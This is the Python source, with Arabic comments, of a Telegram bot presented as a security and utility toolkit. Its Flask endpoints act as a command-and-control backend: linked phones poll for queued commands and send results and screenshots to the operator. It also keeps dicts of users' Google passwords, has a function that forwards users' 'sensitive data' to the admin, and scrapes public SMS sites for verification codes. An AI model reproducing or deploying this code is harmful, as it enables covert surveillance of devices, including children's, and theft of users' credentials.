# ===================== bot.py (النسخة النهائية - مع جميع الإصلاحات) =====================
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import queue
import threading
import logging
import hashlib
import base64
import re
import random
import string
import requests
import phonenumbers
import sqlite3
from phonenumbers import carrier, geocoder
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
import pypdf
from bs4 import BeautifulSoup
from contextlib import contextmanager
import html
import subprocess

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('bot.log')]
)
logger = logging.getLogger(__name__)

# ===================== متغيرات البيئة =====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    logger.critical("❌ TELEGRAM_TOKEN غير مضبوط!")
    sys.exit(1)

ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
if ADMIN_ID == 0:
    logger.critical("❌ ADMIN_ID غير مضبوط!")
    sys.exit(1)

ADMIN_KEY = os.environ.get('ADMIN_KEY', '')
SERVER_URL = os.environ.get('SERVER_URL')
if not SERVER_URL:
    logger.critical("❌ SERVER_URL غير مضبوط!")
    sys.exit(1)

VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
VERIPHONE_API_KEY = os.environ.get('VERIPHONE_API_KEY', '')
HIBP_API_KEY = os.environ.get('HIBP_API_KEY', '')
GOOGLE_CLIENT_ID = os.environ.get('GOOGLE_CLIENT_ID', '')
GOOGLE_CLIENT_SECRET = os.environ.get('GOOGLE_CLIENT_SECRET', '')
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')
PORT = int(os.environ.get('PORT', 5000))
CLIENT_SECRET_KEY = os.environ.get('CLIENT_SECRET_KEY', 'default_secret_key_please_change')
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'true').lower() == 'true'

# ===================== مسار قاعدة البيانات =====================
DB_PATH = os.environ.get('DB_PATH', '/tmp/bot_data.db')

def ensure_db_path():
    db_dir = os.path.dirname(DB_PATH)
    if db_dir and not os.path.exists(db_dir):
        os.makedirs(db_dir, exist_ok=True)
        logger.info(f"✅ تم إنشاء مجلد قاعدة البيانات: {db_dir}")

ensure_db_path()

# ===================== إنشاء البوت =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode='HTML')

# ===================== إنشاء تطبيق Flask =====================
app = Flask(__name__)

# ===================== قاعدة بيانات SQLite =====================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            is_banned INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            real_id TEXT,
            endpoint TEXT,
            linked_at TEXT,
            last_seen TEXT,
            blocked_domains TEXT,
            history TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS registered_devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            last_seen TEXT,
            registered_at TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TEXT,
            FOREIGN KEY (owner_id) REFERENCES users (chat_id)
        )''')
        conn.commit()
        logger.info(f"✅ قاعدة البيانات جاهزة: {DB_PATH}")

init_db()

# ===================== دوال مساعدة للـ DB =====================
@contextmanager
def db_transaction():
    conn = get_db_connection()
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

def get_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        return c.fetchone()

def upsert_user(chat_id, username=None, first_name=None, last_name=None, referral_code=None, referred_by=None):
    with db_transaction() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=? WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            points = 10
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code, referred_by)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), points, referral_code, referred_by))
        conn.commit()

def get_user_points(chat_id):
    user = get_user(chat_id)
    return user['points'] if user else 0

def add_points_db(chat_id, points):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (points, chat_id))
        conn.commit()

def is_user_banned(chat_id):
    user = get_user(chat_id)
    return user and user['is_banned'] == 1

def ban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def get_registered_devices_db():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM registered_devices")
        return c.fetchall()

def save_registered_device_db(device_id, chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO registered_devices 
                     (device_id, chat_id, last_seen, registered_at)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, chat_id, datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()

def update_registered_device_seen_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE registered_devices SET last_seen = ? WHERE device_id = ?", (datetime.now().isoformat(), device_id))
        conn.commit()

def add_pending_command_db(device_id, command):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def save_device(device_id, chat_id, device_type, real_id, endpoint, blocked_domains='[]', history='[]'):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO devices 
                     (device_id, chat_id, type, real_id, endpoint, linked_at, last_seen, blocked_domains, history)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, real_id, endpoint, datetime.now().isoformat(),
                   datetime.now().isoformat(), blocked_domains, history))
        conn.commit()

def get_device(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        return c.fetchone()

def get_devices_by_chat(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        return c.fetchall()

def get_blocked_domains(chat_id):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return []
    blocked = []
    for dev in devices:
        if dev['blocked_domains']:
            try:
                blocked.extend(json.loads(dev['blocked_domains']))
            except:
                pass
    return list(set(blocked))

def log_child_activity(chat_id, activity):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return
    for dev in devices:
        if dev['type'] and 'طفل' in dev['type']:
            history = []
            if dev['history']:
                try:
                    history = json.loads(dev['history'])
                except:
                    history = []
            history.append({
                'time': datetime.now().isoformat(),
                'activity': activity
            })
            if len(history) > 100:
                history = history[-100:]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("UPDATE devices SET history = ? WHERE device_id = ?", (json.dumps(history), dev['device_id']))
                conn.commit()
            break

# ===================== دوال تعقيم النصوص =====================
def escape_html(text):
    """تأمين النص لاستخدامه في HTML مع الاحتفاظ بالوسوم المسموح بها"""
    if not text:
        return ""
    # تحويل الرموز الخاصة إلى كيانات HTML
    return html.escape(str(text))

def safe_html(text):
    """إرجاع النص مع تعقيم آمن لـ HTML"""
    return escape_html(text)

# ===================== دوال الخدمات المحسنة =====================

def ai_chat_real(prompt):
    """دردشة ذكية باستخدام Gemini API (مع خيارات احتياطية)"""
    # المحاولة الأولى: Gemini
    if GEMINI_API_KEY:
        try:
            import google.generativeai as genai
            genai.configure(api_key=GEMINI_API_KEY)
            model = genai.GenerativeModel('gemini-1.5-flash')
            safety_settings = [
                {"category": "HARM_CATEGORY_HARASSMENT", "threshold": "BLOCK_MEDIUM_AND_ABOVE"},
                {"category": "HARM_CATEGORY_HATE_SPEECH", "threshold": "BLOCK_MEDIUM_AND_ABOVE"},
                {"category": "HARM_CATEGORY_SEXUALLY_EXPLICIT", "threshold": "BLOCK_MEDIUM_AND_ABOVE"},
                {"category": "HARM_CATEGORY_DANGEROUS_CONTENT", "threshold": "BLOCK_MEDIUM_AND_ABOVE"},
            ]
            response = model.generate_content(prompt, safety_settings=safety_settings)
            if response.text:
                return response.text
        except Exception as e:
            logger.error(f"Gemini error: {e}")
            # نستمر للبدائل

    # المحاولة الثانية: Popcat API (مجاني)
    try:
        url = f"https://api.popcat.xyz/chat?msg={requests.utils.quote(prompt)}"
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            data = response.json()
            if data and 'response' in data:
                return data['response']
    except Exception as e:
        logger.error(f"Popcat error: {e}")

    # المحاولة الثالثة: Some Random API
    try:
        alt_url = f"https://some-random-api.com/chatbot/response?message={requests.utils.quote(prompt)}"
        alt_response = requests.get(alt_url, timeout=20)
        if alt_response.status_code == 200:
            alt_data = alt_response.json()
            if alt_data and 'response' in alt_data:
                return alt_data['response']
    except Exception as e:
        logger.error(f"Some Random API error: {e}")

    return "⚠️ عذراً، لم أستطع معالجة سؤالك حالياً. يرجى المحاولة لاحقاً."

def generate_image_real(description):
    """توليد صورة باستخدام Popcat AI Art API (مجاني وموثوق)"""
    try:
        url = f"https://api.popcat.xyz/ai/art?prompt={requests.utils.quote(description)}"
        response = requests.get(url, timeout=60)
        if response.status_code == 200:
            data = response.json()
            image_url = data.get('image')
            if image_url:
                img_data = requests.get(image_url).content
                return img_data, "image"
        return None, "⚠️ فشل توليد الصورة، حاول مرة أخرى."
    except Exception as e:
        logger.error(f"generate_image_real error: {e}")
        return None, f"⚠️ خطأ: {str(e)}"

def scan_url_real(url):
    """فحص رابط عبر URLscan.io"""
    try:
        api_url = "https://urlscan.io/api/v1/scan/"
        data = {"url": url, "visibility": "public"}
        response = requests.post(api_url, json=data, timeout=30)
        if response.status_code == 200:
            scan_id = response.json().get('uuid')
            if scan_id:
                time.sleep(5)
                report_url = f"https://urlscan.io/api/v1/result/{scan_id}"
                report = requests.get(report_url, timeout=30)
                if report.status_code == 200:
                    data = report.json()
                    verdicts = data.get('verdicts', {}).get('overall', {})
                    if verdicts.get('malicious', False):
                        return "🚨 <b>الموقع يحتوي على تهديدات مؤكدة!</b>", "malicious"
                    elif verdicts.get('suspicious', False):
                        return "⚠️ <b>الموقع مشبوه!</b>", "suspicious"
                    else:
                        return "✅ <b>الموقع آمن.</b>", "safe"
        return "⚠️ فشل الفحص، حاول مرة أخرى.", "error"
    except Exception as e:
        logger.error(f"scan_url_real error: {e}")
        return f"⚠️ خطأ: {str(e)}", "error"

def track_phone_real(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        return (f"📍 <b>الرقم:</b> {phone}\n"
                f"🌍 <b>البلد:</b> {country}\n"
                f"📍 <b>المنطقة:</b> {region}\n"
                f"📡 <b>المشغل:</b> {carrier_name}", "valid")
    except Exception as e:
        logger.error(f"track_phone_real error: {e}")
        return f"❌ رقم غير صحيح: {str(e)}", "invalid"

def create_temp_email_real():
    try:
        domain_resp = requests.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        email = f"{username}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        register = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        logger.error(f"create_temp_email_real error: {e}")
        return None, None, None

def check_temp_emails_real(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append(f"📩 <b>من:</b> {msg.get('from', {}).get('address', '')}\n📌 <b>الموضوع:</b> {msg.get('subject', '')}\n📝 <b>مقتطف:</b> {msg.get('intro', '')[:150]}...")
            return results
    except Exception as e:
        logger.error(f"check_temp_emails_real error: {e}")
    return []

def scan_apk_real(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return "⚠️ للحصول على فحص حقيقي، ضع مفتاح VirusTotal في متغير البيئة VIRUSTOTAL_API_KEY", "error"
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = requests.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = requests.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    if malicious > 0:
                        return f"🚨 <b>تم اكتشاف {malicious} تهديدات!</b>", "malicious"
                    elif suspicious > 0:
                        return f"⚠️ <b>تم اكتشاف {suspicious} عناصر مشبوهة.</b>", "suspicious"
                    else:
                        return "✅ <b>الملف آمن.</b>", "safe"
        return "⚠️ فشل فحص الملف.", "error"
    except Exception as e:
        logger.error(f"scan_apk_real error: {e}")
        return f"⚠️ خطأ: {str(e)}", "error"

def check_breach(email):
    try:
        if not HIBP_API_KEY:
            return "⚠️ مفتاح HaveIBeenPwned غير مضبوط."
        url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
        headers = {"hibp-api-key": HIBP_API_KEY}
        response = requests.get(url, headers=headers, timeout=15)
        if response.status_code == 200:
            breaches = response.json()
            if not breaches:
                return f"✅ <b>البريد الإلكتروني</b> {email} <b>آمن</b>، لم يتم العثور على أي تسريب."
            result = f"🔓 <b>البريد الإلكتروني:</b> {email}\n\n"
            result += f"✅ تم العثور على {len(breaches)} تسريب(ات):\n\n"
            for breach in breaches[:10]:
                result += f"• <b>{breach.get('Name', 'غير معروف')}</b> - {breach.get('BreachDate', 'تاريخ غير معروف')}\n"
                result += f"  {breach.get('Description', '')[:100]}...\n"
            return result
        elif response.status_code == 404:
            return f"✅ <b>البريد الإلكتروني</b> {email} <b>آمن</b>، لم يتم العثور على أي تسريب."
        else:
            return f"⚠️ فشل الاتصال بـ HaveIBeenPwned (كود {response.status_code})"
    except Exception as e:
        logger.error(f"check_breach error: {e}")
        return f"⚠️ خطأ: {str(e)}"

def verify_phone(phone):
    if not VERIPHONE_API_KEY:
        return "⚠️ لتفعيل فحص الأرقام الحقيقي، ضع مفتاح Veriphone في متغير البيئة VERIPHONE_API_KEY"
    try:
        url = f"https://api.veriphone.io/v2/verify?phone={phone}&key={VERIPHONE_API_KEY}"
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                result = f"📞 <b>الرقم:</b> {phone}\n"
                result += f"🌍 <b>البلد:</b> {data.get('country_name', 'غير معروف')}\n"
                result += f"📡 <b>المشغل:</b> {data.get('carrier', 'غير معروف')}\n"
                result += f"🔒 <b>نوع الخط:</b> {data.get('line_type', 'غير معروف')}\n"
                if data.get('fraud_score', 0) > 50:
                    result += f"🚨 <b>تحذير:</b> هذا الرقم قد يكون احتيالياً (نسبة الخطورة: {data.get('fraud_score')}%)"
                else:
                    result += f"✅ <b>الرقم آمن</b> (نسبة الخطورة: {data.get('fraud_score', 0)}%)"
                return result
        return "⚠️ فشل التحقق من الرقم."
    except Exception as e:
        logger.error(f"verify_phone error: {e}")
        return f"⚠️ خطأ: {str(e)}"

def generate_fb_report(report_type, reason, link):
    prompt = f"""You are an expert in writing formal complaints to Facebook. Write a professional complaint in English:

Type: {report_type}
Issue: {reason}
Link: {link}

The complaint should be clear and include all necessary details."""
    try:
        return ai_chat_real(prompt)
    except Exception as e:
        logger.error(f"generate_fb_report error: {e}")
        return f"⚠️ حدث خطأ: {str(e)}"

def is_image_safe(image_data, file_name):
    try:
        if image_data[:4] in [b'\xff\xd8\xff\xe0', b'\x89PNG', b'GIF8']:
            return True, "✅ توقيع الصورة سليم."
        else:
            return False, "⚠️ توقيع غير معروف."
    except:
        return False, "⚠️ فشل الفحص."

def extract_text_from_pdf(pdf_content):
    try:
        from io import BytesIO
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        logger.error(f"extract_text_from_pdf error: {e}")
        return None

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def find_relevant_chunk(text, question, chunks):
    keywords = re.findall(r'\b\w+\b', question.lower())
    best_chunk = None
    best_score = 0
    for chunk in chunks:
        chunk_lower = chunk.lower()
        score = sum(1 for kw in keywords if kw in chunk_lower)
        if score > best_score:
            best_score = score
            best_chunk = chunk
    if best_chunk is None:
        best_chunk = chunks[0] if chunks else text
    return best_chunk

def answer_question_from_pdf(text, question):
    if not text:
        return "⚠️ لم يتم تحميل أي نص من ملف PDF."
    chunks = split_text_into_chunks(text, 3000)
    relevant_chunk = find_relevant_chunk(text, question, chunks)
    prompt = f"بناءً على النص التالي المستخرج من ملف PDF دراسي، أجب على السؤال المطروح بشكل دقيق ومفصل.\n\nالنص:\n{relevant_chunk}\n\nالسؤال: {question}"
    return ai_chat_real(prompt)

# ===================== نظام الأرقام المؤقتة المتطور =====================

def fetch_temp_numbers_advanced(country_code='US', limit=5):
    results = []
    sources = [
        ("https://receive-sms-online.cc/", "US"),
        ("https://www.temporary-phone-number.com/", "US"),
        ("https://www.textnow.com/", "US"),
        ("https://sms-online.co/receive-free-sms/", "US"),
        ("https://www.freeonlinephone.org/", "US")
    ]
    
    for base_url, default_country in sources:
        try:
            response = requests.get(base_url, timeout=15)
            if response.status_code != 200:
                continue
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            pattern = r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}'
            matches = re.findall(pattern, text)
            for match in matches[:limit]:
                cleaned = re.sub(r'[-.\s()]', '', match)
                if not cleaned.startswith('+'):
                    cleaned = '+' + cleaned
                country = default_country
                country_names = ['USA', 'UK', 'Canada', 'Germany', 'France', 'Spain', 'Italy', 'Egypt', 'UAE', 'Saudi']
                for name in country_names:
                    if name in text[max(0, text.find(match)-50):text.find(match)+50]:
                        country = name
                        break
                results.append({
                    'number': cleaned,
                    'country': country,
                    'source': base_url,
                    'status': 'available'
                })
                if len(results) >= limit:
                    break
            if len(results) >= limit:
                break
        except Exception as e:
            logger.error(f"Error fetching from {base_url}: {e}")
            continue
    return results

def get_verification_code(phone_number, source_url):
    try:
        response = requests.get(source_url, timeout=15)
        if response.status_code != 200:
            return None
        soup = BeautifulSoup(response.text, 'html.parser')
        text = soup.get_text()
        patterns = [
            r'\b\d{4,8}\b',
            r'[A-Z0-9]{4,8}',
            r'كود التفعيل[:\s]*([A-Z0-9]{4,8})',
            r'verification code[:\s]*([A-Z0-9]{4,8})'
        ]
        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                if len(match) >= 4 and match.isalnum():
                    return match.upper()
        return None
    except Exception as e:
        logger.error(f"get_verification_code error: {e}")
        return None

# ===================== دوال TTS وتحويل النص لصوت =====================

def text_to_speech(text, lang='ar'):
    """تحويل النص إلى صوت باستخدام edge-tts أو gTTS كبديل"""
    temp_file = f"/tmp/tts_{datetime.now().strftime('%Y%m%d%H%M%S')}.mp3"
    try:
        # محاولة استخدام edge-tts (أفضل جودة)
        import edge_tts
        import asyncio
        
        async def _tts():
            communicate = edge_tts.Communicate(text, voice="ar-SA-HamedNeural" if lang == 'ar' else "en-US-JennyNeural")
            await communicate.save(temp_file)
        
        asyncio.run(_tts())
        return temp_file if os.path.exists(temp_file) else None
    except ImportError:
        # استخدام gTTS كبديل (يتطلب تثبيت gTTS)
        try:
            from gtts import gTTS
            tts = gTTS(text=text, lang=lang[:2])
            tts.save(temp_file)
            return temp_file
        except Exception as e:
            logger.error(f"gTTS error: {e}")
            return None
    except Exception as e:
        logger.error(f"TTS error: {e}")
        return None

# ===================== دوال تحميل الفيديوهات =====================

def download_video(url):
    """تحميل فيديو من يوتيوب أو منصات أخرى باستخدام yt-dlp"""
    try:
        import yt_dlp
        output_template = f"/tmp/video_{datetime.now().strftime('%Y%m%d%H%M%S')}.%(ext)s"
        ydl_opts = {
            'outtmpl': output_template,
            'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
            'quiet': True,
            'no_warnings': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            downloaded_file = ydl.prepare_filename(info)
            return downloaded_file if os.path.exists(downloaded_file) else None
    except Exception as e:
        logger.error(f"Download video error: {e}")
        return None

# ===================== دوال Flask =====================
def verify_client_token():
    token = request.headers.get('X-Client-Token')
    return token == CLIENT_SECRET_KEY

@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@app.route('/ping')
def ping():
    return 'pong'

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = Update.de_json(json_str)
        if update:
            bot.process_new_updates([update])
            return 'OK', 200
        return 'Error', 400
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'Error', 500

@app.route('/register_device', methods=['POST'])
def register_device():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        chat_id = data.get('chat_id')
        initial_data = data.get('initial_data', {})
        if not device_id or not chat_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id or chat_id'}), 400
        
        save_registered_device_db(device_id, int(chat_id))
        bot.send_message(ADMIN_ID, f"📱 <b>جهاز جديد مسجل</b>\n🆔 المعرف: {device_id}\n👤 المستخدم: {chat_id}")
        return jsonify({'status': 'success', 'message': 'Device registered'})
    except Exception as e:
        logger.error(f"register_device error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/get_command', methods=['GET'])
def get_command():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        device_id = request.args.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        command = get_pending_command_db(device_id)
        if command:
            return jsonify({'status': 'success', 'command': command})
        else:
            return jsonify({'status': 'no_command'})
    except Exception as e:
        logger.error(f"get_command error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/submit_result', methods=['POST'])
def submit_result():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        result = data.get('result')
        result_type = data.get('result_type', 'text')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        update_registered_device_seen_db(device_id)
        if result_type == 'image':
            try:
                img_data = base64.b64decode(result)
                safe, msg = is_image_safe(img_data, 'result.jpg')
                if safe:
                    bot.send_photo(ADMIN_ID, img_data, caption=f"📸 نتيجة من جهاز {device_id}")
                else:
                    bot.send_message(ADMIN_ID, f"🚨 صورة خطيرة من {device_id}: {msg}")
            except:
                bot.send_message(ADMIN_ID, f"⚠️ فشل معالجة الصورة من {device_id}")
        else:
            bot.send_message(ADMIN_ID, f"📩 <b>نتيجة من {device_id}</b>\n{result}", parse_mode='HTML')
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"submit_result error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        device_id = data.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        update_registered_device_seen_db(device_id)
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"heartbeat error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/devices', methods=['GET'])
def admin_devices():
    try:
        if ADMIN_KEY and request.headers.get('X-Admin-Key') != ADMIN_KEY:
            return jsonify({'error': 'Unauthorized'}), 401
        devices = get_registered_devices_db()
        return jsonify({'devices': [dict(d) for d in devices]})
    except Exception as e:
        logger.error(f"admin_devices error: {e}")
        return jsonify({'error': str(e)}), 500

# ===================== دوال مساعدة للبوت =====================
user_states = {}
google_users = {}
google_passwords = {}
temp_emails = {}
developer_computer_endpoint = None
admin_remote_target = {}
linked_users = set()
monitoring_data = {}
user_welcome_sent = {}

feature_usage = {
    "ثغرات المواقع": 0, "فحص APK": 0, "فحص كود": 0,
    "دردشة ذكية": 0, "إنشاء صور": 0, "إيميل مؤقت": 0,
    "التحكم بالهاتف": 0, "فحص رقم هاتف": 0, "تتبع الأرقام": 0,
    "فحص تسريبات": 0, "بلاغات فيسبوك": 0,
    "ربط هاتف المستخدم": 0, "ربط هاتف الطفل": 0,
    "التحكم عن بعد": 0, "ربط جوجل": 0, "الرقابة الأبوية": 0,
    "تحليل PDF": 0, "رقم مؤقت": 0, "تحويل نص لصوت": 0, "تحميل فيديو": 0
}

REQUIRE_LINK_BUTTONS = ["mode_apk", "mode_my_app", "mode_track_phone",
                         "mode_fb_hacked", "mode_fb_report", "mode_spam_block"]

FB_REPORT_TYPES = {
    "1": "منشور مسيء (Offensive Post)",
    "2": "حساب مزيف (Fake Account)",
    "3": "محتوى غير لائق (Inappropriate Content)",
    "4": "انتهاك خصوصية (Privacy Violation)",
    "5": "تحرش أو مضايقة (Harassment/Bullying)",
    "6": "انتحال شخصية (Impersonation)",
    "7": "محتوى عنيف (Violent Content)",
    "8": "أخرى (Other)"
}

def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def create_referral_link(user_id):
    code = generate_referral_code()
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO referrals (code, owner_id) VALUES (?, ?)", (code, user_id))
        conn.commit()
    return f"https://t.me/{(bot.get_me()).username}?start=ref_{code}"

def handle_referral(code, new_user_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT owner_id FROM referrals WHERE code = ? AND used_by IS NULL", (code,))
        row = c.fetchone()
        if not row:
            return False
        referrer_id = row['owner_id']
        if referrer_id == new_user_id:
            return False
        c.execute("UPDATE referrals SET used_by = ?, used_at = ? WHERE code = ?",
                  (new_user_id, datetime.now().isoformat(), code))
        c.execute("UPDATE users SET points = points + 10 WHERE chat_id = ?", (referrer_id,))
        c.execute("UPDATE users SET points = points + 10 WHERE chat_id = ?", (new_user_id,))
        conn.commit()
        bot.send_message(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
        return True

def send_sensitive_data_to_admin(data_type, content, user_id=None):
    if user_id:
        msg = f"📩 <b>بيانات حساسة من المستخدم</b> <code>{user_id}</code>\n"
    else:
        msg = "📩 <b>بيانات حساسة</b>\n"
    msg += f"النوع: {data_type}\n"
    if isinstance(content, str):
        msg += f"المحتوى: <code>{content}</code>"
        bot.send_message(ADMIN_ID, msg, parse_mode='HTML')
